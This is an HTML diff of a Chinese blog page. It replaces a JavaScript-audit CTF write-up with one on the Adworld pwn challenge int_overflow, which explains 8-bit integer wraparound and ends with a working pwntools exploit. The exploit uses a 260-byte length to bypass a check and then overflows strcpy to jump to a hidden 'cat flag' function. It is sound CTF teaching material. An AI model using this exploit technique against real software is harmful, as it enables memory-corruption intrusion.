@@ -33,7 +33,16 @@
             文章目录
           </p>
           <div class="toc-container hidden lg:block">
-            
+            <ul class="markdownIt-TOC">
+<li><a href="#%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E7%9F%A5%E8%AF%86">整数溢出知识</a></li>
+<li><a href="#%E8%A7%A3%E9%A2%98">解题</a>
+<ul>
+<li><a href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90">题目分析</a></li>
+<li><a href="#exp%E7%BC%96%E5%86%99">exp编写</a></li>
+</ul>
+</li>
+</ul>
+
           </div>
         </div>
       
@@ -78,82 +87,115 @@
 <div class="mask" onclick="closeMenu()">
 </div>
       <div class="content-wrapper py-32 lg:p-8 lg:w-3/4 post-detail animated fadeIn">
-        <h1 class="text-3xl font-bold lg:mt-16">攻防世界web新手区javascript审计-&#34;sample js&#34;</h1>
+        <h1 class="text-3xl font-bold lg:mt-16">攻防世界pwn新手区—int_overflow</h1>
         <div class="text-sm text-gray-700 lg:my-8">
-          2020-04-27 / 4 min read
+          2020-06-01 / 4 min read
         </div>
         
-          <img class="post-feature-image rounded-lg mx-auto my-4" src="https://ss1.bdstatic.com/70cFuXSh_Q1YnxGkpoWK1HF6hhy/it/u=3842647101,4253857314&amp;fm=26&amp;gp=0.jpg" alt="">
+          <img class="post-feature-image rounded-lg mx-auto my-4" src="https://zhangzy999.github.io//post-images/gong-fang-shi-jie-pwn-xin-shou-qu-int_overflow.jpg" alt="">
         
         <div class="post-content yue">
-          <p>打开环境，浏览器弹出窗口提示我们输入密码<br>
-<img src="https://zhangzy999.github.io//post-images/1587959009848.png" alt="" loading="lazy"></p>
-<p>我们习惯性的查看页面源码，并且题目已经给我们提示：“simple js”<br>
-得到一串js代码，应该是让我们审计js代码没跑了o.o<br>
-<img src="https://zhangzy999.github.io//post-images/1587959071008.png" alt="" loading="lazy"></p>
-<pre><code class="language-JavaScript">    function dechiffre(pass_enc){           //这一部分是定义了一个函数dechiffre,参数为pass_enc
-        var pass = &quot;70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65&quot;;     //定义了pass字符串
-        var tab  = pass_enc.split(',');     //定义了tab变量，其中.split()方法是将一个字符串分割为字符数组，括号里单引号下的逗号是按逗号分割
-                var tab2 = pass.split(',');     //tab2变量是对pass字符串进行的分割
-                var i,j,k,l=0,m,n,o,p = &quot;&quot;;     // 定义了许多变量，其中未被赋值的变量为undefined
-                i = 0;
-                j = tab.length;     //.length是返回tab数组的长度，j=36
-                k = j + (l) + (n=0);
-                n = tab2.length;    // 先定义了n=0，k=18+0+0=18     然后给n赋值n=18
-                for(i = (o=0); i &lt; (k = j = n); i++ )       //条件是i=0,i&lt;18(把n的值赋给j，再把j的值赋给k)
-                {
-                    o = tab[i-l];       //先把tab[i-1]的值赋给o但是我们会发现，后面紧接着有把tab2[i]的值赋给o，这一条语句相当于无用
-                    p += String.fromCharCode((o = tab2[i]));    //上面定义了变量p=“”,String.fromCharCode()方法是把Unicode编码转化为字符串
-                    if(i == 5)
-                        break;        
-                 }      // 通过运行此程序段，并且加上document.write(p+”&lt;br/&gt;”);输出p的值我们发现p=FAUX P
-                 for(i = (o=0); i &lt; (k = j = n); i++ ){     // 第二个for循环，i=0，i&lt;18,i++ 
-                        o = tab[i-l];
-                        if(i &gt; 5 &amp;&amp; i &lt; k-1)
-                             p += String.fromCharCode((o = tab2[i]));      //该条循环与上个循环相似，最终发现输出的p=FAUX PASSWORD HAH
-                        }
-        p += String.fromCharCode(tab2[17]);   
-        pass = p;
-        return pass;    //完整的p是p=p=FAUX PASSWORD HAHA（假的密码哈哈）😢
-    }
-    //最终函数返回p，但仔细观察我们发现p始终与tab2挂钩，而tab2的值是pass分割成数组的值，pass是定值，也就是说我们函数的参数pass_enc在这个函数里无用！
-    String[&quot;fromCharCode&quot;](dechiffre(&quot;\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30&quot;));
-    h = window.prompt('Enter password');
-    alert( dechiffre(h) );
+          <p>听名字就是整数溢出<br>
+先学习下什么是整数溢出</p>
+<h1 id="整数溢出知识">整数溢出知识</h1>
+<p>看那种官方的说明看的头大，直接说说我对整数溢出的理解emm<br>
+整数溢出，顾名思义就是整数溢出来了，什么是“溢出来”，就是256 = 0，65536 = 0 之类的<br>
+我们看个例子  我们在c语言中，用char定义一个变量c，用来存放一个1字节8个二进制位的数据<br>
+现在的书本也好，教师也好，总喜欢把char讲成定义字符型变量，其实不是的，char来定义变量的时候，本质就是为一个变量开辟一个字节的内存用来存放数据，这一个字节的空间是由我们任意支配的，想存什么类型的数据都可以，只不过大家都习惯存字符型的而已，跑题了（</p>
+<pre><code class="language-c">char c = 1;
 </code></pre>
-<p>以上我用注释的形式来为大家解释了每一条语句的作用，如果你是比我还萌的萌新，仔细看看肯定是会有收获的（狗头保命）<br>
-通过分析我们发现了我们传入的参数p对函数最后返回的结果毫无影响，<strong>因为无论我们输入什么都存到了tab里，而整个函数是对tab2这个数组的操作，无论我们输入什么，最终页面都返回给我们faux password haha</strong>,所以通过分析，那一串16进制的数字转码后应该就是flag了，因为它孤零零的在那里，前不着村后不着店，煞是诡异。。。<br>
-所以我们就自己写js代码，把他翻译出来，bingo!<br>
-首先我们先把那一串\x的给翻译成ascii，在python中自动完成：<br>
-<img src="https://zhangzy999.github.io//post-images/1587970672958.png" alt="" loading="lazy"><br>
-然后直接调用fromCharCode方法得到flag</p>
-<pre><code class="language-JavaScript">var password = String.fromCharCode(55,56,54,79,115,69,114,116,107,49,50);
-console.log(password);
+<p>那么在内存中就是 0000 0001<br>
+如果是c = -1<br>
+那么在内存中就是 1000 0001<br>
+1代表符号位<br>
+那么思考下，c可存储的范围是多少呢？ 是 -128—127<br>
+如果c = 127，即 0111 1111 那么c = c+1，再打印一下c是多少呢？<br>
+<img src="https://zhangzy999.github.io//post-images/1591016175946.png" alt="" loading="lazy"><br>
+神奇的事情发生了，打印出来是-128，其实也不神奇，因为0111 1111 + 0000 0001 = 1000 0000  = -128<br>
+<img src="https://zhangzy999.github.io//post-images/1591016444486.png" alt="" loading="lazy"><br>
+如果是无符号类型的话，表示的范围就是0—255<br>
+我们看代码</p>
+<pre><code class="language-c">unsigned char c = 256;
+printf(&quot;%d\n&quot;,c);
 </code></pre>
-<p><img src="https://zhangzy999.github.io//post-images/1587971171189.png" alt="" loading="lazy"><br>
-以上就是本题的解法，个人认为该题目还是有那么一丢丢难度的（毕竟我js不太好😶）</p>
+<p>这样又会变成什么呢？思考一下 256 = 255 + 1<br>
+也就是 1111 1111 + 1 结果等于 (0001)0000 0000 然而我们内存只给它开辟了一个字节的空间，所以结果会等于零，dev上运行一下看看<br>
+<img src="https://zhangzy999.github.io//post-images/1591016989930.png" alt="" loading="lazy"><br>
+这就是整数溢出的原理，这是最简单的unsigned char情况，对于word，dword情况也一样</p>
+<h1 id="解题">解题</h1>
+<h2 id="题目分析">题目分析</h2>
+<p>我们运行一下程序看看是什么情况<br>
+<img src="https://zhangzy999.github.io//post-images/1591018218857.png" alt="" loading="lazy"><br>
+简单的一个模拟登录的功能，接着我们查看一下开启了哪些保护机制<br>
+<img src="https://zhangzy999.github.io//post-images/1591018245408.png" alt="" loading="lazy"><br>
+栈不可执行保护被打开了，我们直接IDA来看看main函数叭<br>
+<img src="https://zhangzy999.github.io//post-images/1591018283129.png" alt="" loading="lazy"><br>
+我们跟进去login函数<br>
+<img src="https://zhangzy999.github.io//post-images/1591018316958.png" alt="" loading="lazy"><br>
+有一个check密码的函数，我们跟进去看看<br>
+<img src="https://zhangzy999.github.io//post-images/1591018361068.png" alt="" loading="lazy"><br>
+发现strcpy函数，这个函数可能会存在溢出，发现是把s赋给dest，而s的空间又大于dest，所以存在溢出（s即我们在login函数里面传入的参数buf），但是关键是上面有一个判断长度的if判断语句，所以我们得想办法来绕过if判断<br>
+看到v3是unsigned char类型的（即IDA中的unsigned __int8），要求v3在4—8之间<br>
+根据之前讲解的就可以使用整数溢出来绕过if判断<br>
+256 = 0，那么260 = 4，目标明确了，然后找偏移量<br>
+<img src="https://zhangzy999.github.io//post-images/1591020302218.png" alt="" loading="lazy"><br>
+奈斯，然后发现一个奇奇怪怪的函数<br>
+<img src="https://zhangzy999.github.io//post-images/1591020348124.png" alt="" loading="lazy"><br>
+奈斯，然后找到cat flag的地址<br>
+<img src="https://zhangzy999.github.io//post-images/1591020376308.png" alt="" loading="lazy"><br>
+万事具备，只欠exp</p>
+<h2 id="exp编写">exp编写</h2>
+<pre><code class="language-python">from pwn import *
+
+ip = '124.126.19.106'
+port = '37599'
+r = remote(ip,port)
+
+system_addr = 0x08048694
+offset = 0x14 + 0x4    #加4是覆盖原函数的ebp的值
+p32_system_addr = 0x4    #这个是p32发过去system的地址所占的4个字节，在整数溢出的时候要注意一下这个点    
+unsigned_int_flow = 260 - offset - p32_system_addr    
+
+payload = 'A' * offset + p32(system_addr) + 'A' * unsigned_int_flow
+
+r.recvuntil('Your choice:')
+r.sendline('1')
+
+r.recvuntil('Please input your username:')
+r.sendline('Hello')
+
+r.recvuntil('Please input your passwd:')
+r.sendline(payload)
+r.interactive()
+</code></pre>
+<p>然后就是flag辣，奈斯<br>
+<img src="https://zhangzy999.github.io//post-images/1591020622027.png" alt="" loading="lazy"></p>
 
         </div>
 
         
-          <a class="animated fadeInUp p-2 items-center text-sm text-gray-700 border hover:bg-gray-300 leading-none rounded-full flex lg:inline-flex m-4 " href="https://zhangzy999.github.io/tag/QUggXdyrg/">
-            <span class="flex-auto">代码审计</span>
+          <a class="animated fadeInUp p-2 items-center text-sm text-gray-700 border hover:bg-gray-300 leading-none rounded-full flex lg:inline-flex m-4 " href="https://zhangzy999.github.io/tag/rAKjBwkYk/">
+            <span class="flex-auto">整数溢出</span>
+          </a>
+        
+          <a class="animated fadeInUp p-2 items-center text-sm text-gray-700 border hover:bg-gray-300 leading-none rounded-full flex lg:inline-flex m-4 " href="https://zhangzy999.github.io/tag/wxEMEW0CR/">
+            <span class="flex-auto">栈溢出</span>
           </a>
         
 
 
         <div class="flex justify-between py-8">
           
-            <div class="prev-post">
-              <a href="https://zhangzy999.github.io/post/suibianzhu/">
+
+          
+            <div class="next-post">
+              <a href="https://zhangzy999.github.io/post/ad5_guess_num/">
                 <h3 class="post-title">
-                  <i class="ri-arrow-left-line"></i>
-                  CTF-强网杯-“随便注”
+                  攻防世界pwn新手区—guess_num
+                  <i class="ri-arrow-right-line"></i>
                 </h3>
               </a>
             </div>
-          
-
           
         </div>
 
